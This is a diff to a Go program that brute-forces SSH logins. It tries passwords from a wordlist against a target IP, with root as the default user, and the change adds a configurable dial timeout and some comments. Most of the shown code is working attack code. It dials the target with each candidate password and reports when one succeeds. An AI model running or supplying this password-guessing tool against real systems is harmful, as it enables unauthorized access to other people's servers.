@@ -1,8 +1,6 @@
 /*
-golang example to find a password for a ssh user
-using a large wordlist file.
-TODO: add args to adjust wait time for connection, check if the ip is down,
-create a results file.
+golang example to find a password for a ssh user using a large wordlist file.
+TODO: add args to check if the ip is down and create a results file.
 */
 package main
 
@@ -23,6 +21,7 @@ var (
 	ip           = flag.String("ip", "192.168.125.100", "indicate the ip address to brute force")
 	port         = flag.Int("port", 22, "indicate port to brute force")
 	user         = flag.String("user", "root", "indicate user to brute force")
+	timer        = flag.Duration("timer", 200*time.Millisecond, "set timeout to ssh dial response (ex:300ms), don't set this too low")
 )
 
 // Define fileScanner with methods
@@ -52,6 +51,7 @@ func (f *fileScanner) GetScan() *bufio.Scanner {
 	return f.Scanner
 }
 
+// Define ssh Dialer with methods
 type Dialer struct {
 	password string
 	err      error
@@ -69,7 +69,7 @@ func sshdialer(password string, ch chan Dialer) {
 		Auth: []ssh.AuthMethod{
 			ssh.Password(password),
 		},
-		Timeout: 150 * time.Millisecond,
+		Timeout: *timer,
 	}
 	//Create dial
 	_, err := ssh.Dial("tcp", *ip+":"+strconv.Itoa(*port), config)
@@ -86,6 +86,7 @@ func sshdialer(password string, ch chan Dialer) {
 	ch <- *salida
 }
 
+// var to test when you find the password
 var found bool
 
 func main() {
@@ -103,7 +104,7 @@ func main() {
 			// Don´t set this time lower, you need to have a proper time to get a response
 			// the response time depends in several factors, it may work with 120 Milliseconds
 			// but sometimes bypass the correct password.
-			time.Sleep(200 * time.Millisecond)
+			time.Sleep(*timer)
 			go func() {
 				for x := range ch {
 					if x.err != nil {
